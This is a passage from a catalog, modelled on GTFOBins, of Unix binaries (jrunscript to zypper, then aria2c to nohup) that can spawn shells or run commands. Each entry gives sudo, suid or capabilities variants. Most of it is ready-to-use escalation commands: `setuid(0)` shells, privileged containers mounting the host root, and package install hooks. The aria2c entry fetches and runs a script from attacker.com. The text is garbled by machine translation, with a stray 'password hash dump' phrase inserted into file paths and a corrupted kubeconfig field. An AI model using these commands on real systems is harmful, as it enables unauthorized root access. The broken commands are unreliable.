jrunscript -e 'exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'
```
**suid** variant:
```bash
jrunscript -e 'exec("/bin/sh -pc $@|sh${IFS}-p _ echo sh -p </dev/tty >/dev/tty 2>/dev/tty")'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `jshell`

```bash
jshell
Runtime.getRuntime().exec("/path/to/command");
```

### `jtag`

```bash
jtag --interactive
shell /bin/sh
```

### `julia`

```bash
julia -e 'run(`/bin/sh`)'
```
**suid** variant:
```bash
julia -e 'run(`/bin/sh -p`)'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `ksu`

```bash
ksu -q -e /bin/sh
```

### `kubectl`

> **注意**: Shell 会被多次生成。
```bash
cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.au然后tication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file
```

### `latex`

```bash
latex --shell-escape '\immediate\write18{/bin/sh}'
```

### `latexmk`

```bash
latexmk -pdf -pdflatex='/bin/sh #' /dev/null
```

### `ld.so`

> `ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions (e.g., `/lib64/ld-linux-x86-64.so.2`). The actual path is can be obtained with:

```
strings /proc/self/exe | head -1
```

> **注意**: The spawned process will be the loader, not the target executable, this might aid evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.
```bash
/path/to/ld.so /bin/sh
```
**suid** variant:
```bash
/path/to/ld.so /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `less`

**方法 1:**

```bash
less /etc/hosts
!/bin/sh
```

**方法 2:**

> **注意**: 需要可选的 `reset` command is needed to receive the echo back of the 输入d keystrokes.
```bash
LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
reset
```

**方法 3:**

```bash
VISUAL='/bin/sh -s --' less /etc/hosts
v
```

### `lftp`

```bash
lftp -c '!/bin/sh'
```

### `loginctl`

> 如果由非特权用户运行，根据系统配置，这可能不起作用。

```bash
loginctl user-status
!/bin/sh
```

### `logrotate`

> **注意**: 此命令对文件权限很挑剔。可以使用现有的配置文件，只要它包含邮件指令。
```bash
echo -e '/path/to/temp-文件转储密码哈希。config {\nmail x@x.x\n}' >/path/to/temp-文件转储密码哈希。config
echo '/bin/sh 0<&2 1>&2' >/path/to/temp-文件转储密码哈希。sh
logrotate -m /path/to/temp-文件转储密码哈希。sh -f /path/to/temp-file
```

### `logsave`

```bash
logsave /dev/null /bin/sh -i
```
**suid** variant:
```bash
logsave /dev/null /bin/sh -i -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `ltrace`

```bash
ltrace -b -L /bin/sh
```

### `lua`

```bash
lua -e 'os.execute("/bin/sh")'
```

### `lxd`

**方法 1:**

> **注意**: 镜像（例如 `ubuntu:16.04`) ）必须已经存在，否则将会被下载。
```bash
lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

**方法 2:**

> **注意**: 这需要在离线状态下运行步骤，然后将生成的镜像上传到目标。使用 [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):

```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine -a i686
```
```bash
lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```

### `m4`

```bash
echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
```

### `mail`

**方法 1:**

```bash
mail --exec='!/bin/sh'
```

**方法 2:**

```bash
mail -f /etc/hosts
!/bin/sh
```

### `make`

```bash
make --eval='$(shell /bin/sh 1>&0)' .
```

### `man`

> **注意**: This requires GNU `troff` (`groff`) to be installed.
```bash
man '-H/bin/sh #' man
```

### `mawk`

```bash
mawk 'BEGIN {system("/bin/sh")}'
```

### `minicom`

> 注意 in some versions, `Meta-Z` 代替 `Ctrl-A`.

**方法 1:**

> **注意**: 运行以下命令打开 TUI 界面，然后：

1. press `Ctrl-A o` 并选择 `Filenames and paths`;
2. press `e`, 输入 `/bin/sh`, 然后 `Enter`;
3. 按 `Esc` 两次;
4. 按 `Ctrl-A k` 来生成 Shell。

获得 Shell 后，使用 `Ctrl-A x`.
```bash
minicom -D /dev/null
```

**方法 2:**

> **注意**: 获得 Shell 后，使用 `Ctrl-A x`.
```bash
echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
minicom -D /dev/null -S /path/to/temp-file
reset^J
```

### `more`

```bash
more /etc/hosts
!/bin/sh
```

### `mosh-server`

> **注意**: 这需要有效的 SSH 访问。
```bash
mosh --server=mosh-server localhost /bin/sh
```

### `msgfilter`

> **注意**: The `kill` 命令来只生成一次 Shell。 Instead of readinf from standard input, it can read files passed via the `-i` 选项读取文件。
```bash
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
```
**suid** variant:
```bash
echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `multitime`

```bash
multitime /bin/sh
```
**suid** variant:
```bash
multitime /bin/sh -p
```

### `mysql`

> 必须有一个可用的 MySQL 服务器来连接。

```bash
mysql -e '\! /bin/sh'
```

### `nano`

**方法 1:**

```bash
nano
^R^X
reset; sh 1>&0 2>&0
```

**方法 2:**

> **注意**: The `SPELL` 环境变量可以代替 `-s` 选项，如果命令行无法更改。
```bash
nano -s /bin/sh
/bin/sh
^T^T
```
**suid** variant:
```bash
nano -s '/bin/sh -p'
/bin/sh -p
^T^T
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `ncdu`

```bash
ncdu
b
```

### `ncftp`

```bash
ncftp
!/bin/sh
```
**suid** variant:
```bash
ncftp
!/bin/sh -p
```
> ℹ️ 此方式通过系统 Shell 运行命令。

### `neofetch`

```bash
echo 'exec /bin/sh' >/path/to/temp-file
neofetch --config /path/to/temp-file
```

### `nice`

```bash
nice /bin/sh
```
**suid** variant:
```bash
nice /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `nmap`

```bash
nmap --interactive
!/bin/sh
```

### `node`

```bash
node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
**capabilities** variant:
```bash
node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```
**suid** variant:
```bash
node -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]})'
```

### `nohup`

> **注意**: 这会在 `nohup.out` 文件中。
```bash
nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'
```
**suid** variant:
```bash
nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `npm`

**方法 1:**

```bash
npm exec /bin/sh
```

**方法 2:**

```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
npm -C . i
```

**方法 3:**

```bash
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
npm -C . run xxx
```

### `nroff`

```bash
echo /bin/sh >groff
chmod +x groff
GROFF_BIN_PATH=. nroff
```

### `nsenter`

> **注意**: Shell 命令可以省略。
```bash
nsenter /bin/sh
```
**suid** variant:
```bash
nsenter /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `octave`

> The payloads are compatible with GUI mode.

```bash
octave-cli --eval 'system("/bin/sh")'
```

### `openvpn`

```bash
openvpn --dev null --script-security 2 --up '/bin/sh -s'
```
**suid** variant:
```bash
openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `opkg`

> **注意**: 使用 Debian package with [fpm](https://github.com/jordansissel/fpm) 生成并上传到目标。

```
echo 'exec /bin/sh' >x.sh
fpm -n x -s dir -t deb -a all --before-install x.sh .
```
```bash
rpm opkg install x_1.0_all.deb
```

### `pdflatex`

```bash
pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
```

### `pdftex`

```bash
pdftex --shell-escape '\write18{/bin/sh}\end'
```

### `perf`

```bash
perf stat /bin/sh
```
**suid** variant:
```bash
perf stat /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `perl`

**方法 1:**

```bash
perl -e 'exec "/bin/sh"'
```
**capabilities** variant:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```

**方法 2:**

> **注意**: The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell.
```bash
PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
```

### `perlbug`

> **注意**: 这要求在生成 Shell 之前多次按 `Enter` 。
```bash
perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
```

### `pexec`

```bash
pexec /bin/sh
```
**suid** variant:
```bash
pexec /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `pg`

```bash
pg /etc/hosts
!/bin/sh
```

### `php`

**方法 1:**

```bash
php -r 'system("/bin/sh -i");'
```
**capabilities** variant:
```bash
php -r 'posix_setuid(0); system("/bin/sh -i");'
```

**方法 2:**

```bash
php -r 'passthru("/bin/sh -i");'
```
**capabilities** variant:
```bash
php -r 'posix_setuid(0); passthru("/bin/sh -i");'
```

**方法 3:**

```bash
php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```
**capabilities** variant:
```bash
php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
```

**方法 4:**

```bash
php -r 'pcntl_exec("/bin/sh");'
```
**capabilities** variant:
```bash
php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
```
**suid** variant:
```bash
php -r 'pcntl_exec("/bin/sh", ["-p"]);'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `pic`

```bash
pic -U
.PS
sh X sh X
```

### `pidstat`

```bash
pidstat -e /bin/sh
```
**suid** variant:
```bash
pidstat -e /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `pip`

```bash
pip config --editor '/bin/sh -s' edit
```

### `pkexec`

```bash
pkexec /bin/sh
```

### `plymouth`

```bash
plymouth ask-for-password --prompt=x --command=/bin/sh
```
**suid** variant:
```bash
plymouth ask-for-password --prompt=x --command='/bin/sh -p'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `podman`

> **注意**: 这需要一个实际可用的镜像（例如 `alpine`) ），如果不存在则下载它。
```bash
podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
```

### `posh`

```bash
posh
```

### `psftp`

```bash
psftp
!/bin/sh
```

### `psql`

> 必须有一个可用的 PostgreSQL 服务器来连接。

```bash
psql
\! /bin/sh
```

### `puppet`

```bash
puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
```

### `pwsh`

```bash
pwsh
```

### `python`

> 这些载荷兼容 Python 2 和 3 版本。

```bash
python -c 'import os; os.execl("/bin/sh", "sh")'
```
**capabilities** variant:
```bash
python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```
**suid** variant:
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `ranger`

```bash
ranger
S
```

### `rc`

```bash
rc
```

### `restic`

**方法 1:**

```bash
RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
```
**suid** variant:
```bash
RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
```

**方法 2:**

```bash
restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
```
**suid** variant:
```bash
restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
```

### `rlwrap`

```bash
rlwrap /bin/sh
```
**suid** variant:
```bash
rlwrap /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `rpm`

**方法 1:**

```bash
rpm --eval '%(/bin/sh 1>&2)'
```

**方法 2:**

```bash
rpm --pipe '/bin/sh 0<&1'
```

### `rpmdb`

```bash
rpmdb --eval '%(/bin/sh 1>&2)'
```

### `rpmquery`

```bash
rpmquery --eval '%(/bin/sh 1>&2)'
```

### `rpmverify`

```bash
rpmverify --eval '%(/bin/sh 1>&2)'
```

### `rsync`

```bash
rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
```
**suid** variant:
```bash
rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `rtorrent`

> **注意**: 获得 Shell 后，使用 `Ctrl-Q`.
```bash
echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```
**suid** variant:
```bash
echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
rtorrent
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `ruby`

```bash
ruby -e 'exec "/bin/sh"'
```
**capabilities** variant:
```bash
ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
```

### `run-parts`

**方法 1:**

```bash
run-parts --new-session --regex '^sh$' /bin
```
**suid** variant:
```bash
run-parts --new-session --regex '^sh$' /bin --arg='-p'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

**方法 2:**

```bash
cp /bin/sh /path/to/temp-dir/
run-parts /path/to/temp-dir/
```
**suid** variant:
```bash
cp /bin/sh /path/to/temp-dir/
run-parts /path/to/temp-dir/ --arg='-p'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `runscript`

```bash
echo '! exec /bin/sh' >/path/to/temp-file
runscript /path/to/temp-file
```

### `rustup`

```bash
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
cp /bin/sh /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc
```

### `sash`

```bash
sash
```

### `scanmem`

```bash
scanmem
shell /bin/sh
```

### `scp`

**方法 1:**

```bash
echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:
```

**方法 2:**

```bash
scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
```

### `screen`

```bash
screen
```

### `script`

```bash
script -q /dev/null
```

### `scrot`

> 这需要一个正在运行的 X 服务器。

```bash
scrot -e /bin/sh
```

### `sed`

**方法 1:**

```bash
sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

**方法 2:**

```bash
sed e
```

### `service`

```bash
service ../../bin/sh
```

### `setarch`

```bash
setarch -3 /bin/sh
```
**suid** variant:
```bash
setarch -3 /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `setlock`

```bash
setlock - /bin/sh
```
**suid** variant:
```bash
setlock - /bin/sh -p
```
> ℹ️ 此方式通过系统 Shell 运行命令。

### `sftp`

> **注意**: 这仍然需要成功连接到服务器。
```bash
sftp user@attacker.com
!/bin/sh
```

### `sg`

> **注意**: 如果指定了当前用户的组，则可以运行命令，因此不需要额外的权限。
```bash
sg $(id -ng)
```
**sudo** variant:
```bash
sg root
```

### `slsh`

```bash
slsh -e 'system("/bin/sh")'
```

### `smbclient`

> **注意**: 当前工作目录中必须存在有效的 SMB/CIFS server must be available.
```bash
smbclient '\\host\share'
!/bin/sh
```

### `socat`

```bash
socat - exec:/bin/sh,pty,ctty,raw,echo=0
```
**suid** variant:
```bash
socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `softlimit`

```bash
softlimit /bin/sh
```
**suid** variant:
```bash
softlimit /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `split`

```bash
split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
```

### `sqlite3`

```bash
sqlite3 /dev/null '.shell /bin/sh'
```

### `ssh`

**方法 1:**

> **注意**: 重新连接可能有助于绕过受限 Shell。
```bash
ssh localhost /bin/sh
```

**方法 2:**

```bash
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

**方法 3:**

> **注意**: 在客户端上生成 Shell，但仍需要成功的远程连接。
```bash
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
```

### `ssh-agent`

```bash
ssh-agent /bin/sh
```
**suid** variant:
```bash
ssh-agent /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `sshfs`

> **注意**: 挂载目录必须可由调用用户写入。
```bash
echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file
chmod +x /path/to/temp-file
sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/
```

### `sshpass`

```bash
sshpass /bin/sh
```
**suid** variant:
```bash
sshpass /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `sshuttle`

```bash
sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
```

### `start-stop-daemon`

```bash
start-stop-daemon -S -x /bin/sh
```
**suid** variant:
```bash
start-stop-daemon -S -x /bin/sh -- -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `stdbuf`

```bash
stdbuf -i0 /bin/sh
```
**suid** variant:
```bash
stdbuf -i0 /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `strace`

```bash
strace -o /dev/null /bin/sh
```
**suid** variant:
```bash
strace -o /dev/null /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `su`

```bash
su -c /bin/sh
```

### `sudo`

```bash
sudo /bin/sh
```

### `systemctl`

**方法 1:**

> **注意**: 服务可能不会使用 `--now`, 启动，在这种情况下可能需要手动启动它。
```bash
echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-文件转储密码哈希。service
systemctl link /path/to/temp-文件转储密码哈希。service
systemctl enable --now /path/to/temp-文件转储密码哈希。service
```

**方法 2:**

```bash
echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target
```

### `systemd-run`

**方法 1:**

```bash
systemd-run -S
```

**方法 2:**

```bash
systemd-run -t /bin/sh
```

### `tar`

**方法 1:**

```bash
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**方法 2:**

```bash
tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
```

**方法 3:**

> **注意**: The archive can also be prepared offline 然后 uploaded to the target.
```bash
echo '/bin/sh 0<&1' >/path/to/temp-file
tar cf /path/to/temp-文件转储密码哈希。tar /path/to/temp-file
tar xf /path/to/temp-文件转储密码哈希。tar --to-command /bin/sh
```

### `task`

```bash
task execute /bin/sh
```

### `taskset`

```bash
taskset 1 /bin/sh
```

### `tasksh`

```bash
tasksh
!/bin/sh
```

### `tclsh`

```bash
tclsh
```

### `tcsh`

```bash
tcsh
```
**suid** variant:
```bash
tcsh -b
```

### `tdbtool`

```bash
tdbtool
! /bin/sh
```

### `telnet`

```bash
telnet
!/bin/sh
```

### `tex`

```bash
tex --shell-escape '\immediate\write18{/bin/sh}'
```

### `time`

> **注意**: 注意 the shell might have its own builtin `time` implementation, which may behave differently than the binary, which is often located at `/usr/bin/time`.
```bash
time /bin/sh
```
**suid** variant:
```bash
time /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `timeout`

```bash
timeout 0 /bin/sh
```
**suid** variant:
```bash
timeout 0 /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `tmate`

```bash
tmate -c /bin/sh
```

### `tmux`

**方法 1:**

```bash
tmux -c /bin/sh
```

**方法 2:**

> **注意**: 提供足够的权限来访问套接字（例如 `/tmp/tmux-xxx/default`).
```bash
tmux -S /path/to/socket
```

### `top`

> **注意**: 配置路径可能不同。
```bash
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return 两次
reset
```

### `torify`

```bash
torify /bin/sh
```

### `torsocks`

```bash
torsocks /bin/sh
```

### `unshare`

```bash
unshare /bin/sh
```
**suid** variant:
```bash
unshare -r /bin/sh
```

### `uv`

```bash
uv run /bin/sh
```

### `valgrind`

```bash
valgrind /bin/sh
```

### `vi`

**方法 1:**

```bash
vi -c ':!/bin/sh' /dev/null
```

**方法 2:**

```bash
vi -c ':shell'
```

**方法 3:**

```bash
vi -c ':set shell=/bin/sh | shell'
```
**suid** variant:
```bash
vi -c ':set shell=/bin/sh\ -p | shell'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

**方法 4:**

```bash
vi -c :terminal /bin/sh
```
**suid** variant:
```bash
vi -c ':terminal /bin/sh -p'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `watch`

**方法 1:**

```bash
watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'
```
**suid** variant:
```bash
watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

**方法 2:**

```bash
watch 'reset; exec /bin/sh 1>&0 2>&0'
```

### `wg-quick`

> **注意**: Use `wg-quick down /path/to/temp-文件转储密码哈希。conf` 以便能够再次运行 Shell。
```bash
cat >/path/to/temp-文件转储密码哈希。conf <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up /path/to/temp-文件转储密码哈希。conf
```

### `wget`

```bash
echo -e '#!/bin/sh\n/bin/sh 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```
**suid** variant:
```bash
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
wget --use-askpass=/path/to/temp-file 0
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `xargs`

**方法 1:**

```bash
xargs -a /dev/null /bin/sh
```
**suid** variant:
```bash
xargs -a /dev/null /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

**方法 2:**

```bash
xargs -a /dev/null /bin/sh
```
**suid** variant:
```bash
xargs -a /dev/null /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

**方法 3:**

```bash
echo x | xargs -o -a /dev/null /bin/sh
```
**suid** variant:
```bash
echo x | xargs -o -a /dev/null /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `xdg-user-dir`

> ` `xdg-user-dir` 的当前实现基本上是 `eval echo \${XDG_${1}_DIR:-$HOME}`, ，因此可以很容易地用于实现命令执行。

```bash
xdg-user-dir '}; /bin/sh #'
```

### `xdotool`

> 这需要一个正在运行的 X 服务器。

```bash
xdotool exec --sync /bin/sh
```
**suid** variant:
```bash
xdotool exec --sync /bin/sh -p
```
> ⚠️ 此方式直接运行命令（不通过系统 Shell）。

### `yarn`

**方法 1:**

```bash
yarn exec /bin/sh
```

**方法 2:**

```bash
echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
yarn --cwd .
```

**方法 3:**

```bash
echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
yarn --cwd . xxx
```

### `yash`

```bash
yash
```

### `yt-dlp`

> **注意**: URL 必须指向一个有效的 YouTube 视频，该视频将被实际下载。
```bash
yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
```

### `zathura`

> 这需要一个正在运行的 X 服务器。

> **注意**: 交互发生在 GUI 窗口中，而 Shell 在终端中生成。
```bash
zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'
```

### `zip`

```bash
zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'
```

### `zsh`

```bash
zsh
```

### `zypper`

**方法 1:**

> **注意**: 复制通常需要提升的权限。
```bash
cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x
```

**方法 2:**

```bash
cp /bin/sh /path/to/temp-dir/zypper-x
PATH=$PATH:/path/to/temp-dir/ zypper x
```

---

## Command (command)

> 该可执行文件可以运行非交互式系统命令。

共 **30** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `acr` | 1 | sudo, suid, unprivileged |
| 2 | `aria2c` | 2 | sudo, suid, unprivileged |
| 3 | `at` | 1 | sudo, unprivileged |
| 4 | `crash` | 1 | sudo, unprivileged |
| 5 | `crontab` | 1 | sudo, unprivileged |
| 6 | `dnf` | 1 | sudo |
| 7 | `dnsmasq` | 1 | sudo, suid, unprivileged |
| 8 | `fail2ban-client` | 2 | sudo |
| 9 | `fastfetch` | 1 | sudo, suid, unprivileged |
| 10 | `fzf` | 1 | sudo, suid, unprivileged |
| 11 | `less` | 2 | sudo, unprivileged |
| 12 | `m4` | 1 | sudo, suid, unprivileged |
| 13 | `nohup` | 1 | sudo, suid, unprivileged |
| 14 | `opencode` | 1 | sudo, suid, unprivileged |
| 15 | `openvt` | 1 | sudo |
| 16 | `php` | 3 | sudo, suid, unprivileged |
| 17 | `pkg` | 1 | sudo |
| 18 | `procmail` | 1 | sudo, unprivileged |
| 19 | `restic` | 2 | sudo, suid, unprivileged |
| 20 | `rpm` | 1 | sudo |
| 21 | `rsyslogd` | 1 | sudo |
| 22 | `rustup` | 1 | sudo, unprivileged |
| 23 | `snap` | 1 | sudo |
| 24 | `sshfs` | 1 | sudo, unprivileged |
| 25 | `sysctl` | 1 | sudo, suid |
| 26 | `systemd-run` | 1 | sudo |
| 27 | `tcpdump` | 2 | sudo, unprivileged |
| 28 | `virsh` | 1 | sudo |
| 29 | `yum` | 1 | sudo |
| 30 | `zic` | 1 | sudo, suid, unprivileged |

### `acr`

```bash
echo -e 'x:\n\t/bin/sh 1>&0 2>&0' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file
```

### `aria2c`

**方法 1:**

> **注意**: 注意 the subprocess is immediately sent to the background.
```bash
echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain
```

**方法 2:**

> **注意**: 远程文件 `aaaaaaaaaaaaaaaa` （必须是 16 位十六进制字符串）包含 Shell 脚本，例如 `/path/to/command`. 注意 said file needs to be written on disk in order to be executed. `--allow-overwrite` 如果使用相同的 GID 多次执行，则需要
```bash
aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=/bin/sh http://attacker.com/aaaaaaaaaaaaaaaa
```

### `at`

```bash
echo /path/to/command | at now
```

### `crash`

```bash
CRASHPAGER=/path/to/command crash -h
```

### `crontab`

> **注意**: This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).
```bash
crontab -e
```

### `dnf`

> **注意**: 使用 RPM package with [fpm](https://github.com/jordansissel/fpm) 生成并上传到目标。

```
echo /path/to/command >x.sh
fpm -n x -s dir -t rpm -a all --before-install x.sh .
```

The `--disablerepo=*` 选项用于没有互联网连接的目标，否则可以省略。
```bash
dnf install -y x-1.0-1.noarch.rpm --disablerepo=*
```

### `dnsmasq`

```bash
dnsmasq --conf-script='/path/to/command 1>&2'
```

### `fail2ban-client`

**方法 1:**

> **注意**: The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return code from the subprocess. The `banip` command will hang until the subprocess returns.
```bash
fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /path/to/command
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x
```

**方法 2:**

```bash
cat >/path/to/temp-dir/fail2ban.conf <<EOF
[Definition]
EOF

cat >/path/to/temp-dir/jail.local <<EOF
[x]
enabled = true
action = x
EOF

mkdir -p /path/to/temp-dir/action.d/
cat >/path/to/temp-dir/action.d/x.conf <<EOF
[Definition]
actionstart = /path/to/command
EOF

mkdir -p /path/to/temp-dir/filter.d/
cat >/path/to/temp-dir/filter.d/x.conf <<EOF
[Definition]
EOF

fail2ban-client -c /path/to/temp-dir/ -v restart
```

### `fastfetch`

```bash
echo '{"modules":[{"输入":"command","key":"x","text":"exec /path/to/command"}]}' >/path/to/temp-文件转储密码哈希。jsonc
fastfetch -c /path/to/temp-文件转储密码哈希。jsonc
```

### `fzf`

> **注意**: Commands can be issued via POST requests, for example:

```
curl http://localhost:12345 -d 'execute(/path/to/command)'
```
```bash
fzf --listen=12345
```

### `less`

**方法 1:**

```bash
cp /path/to/command ~/.lessfilter
less /etc/hosts
```

**方法 2:**

```bash
LESSOPEN='/path/to/command # %s' less /etc/hosts
```

### `m4`

```bash
echo 'esyscmd(/path/to/command)' | m4
```

### `nohup`

> **注意**: The `nohup.out` file contains the standard output and error of the 命令。
```bash
nohup /path/to/command
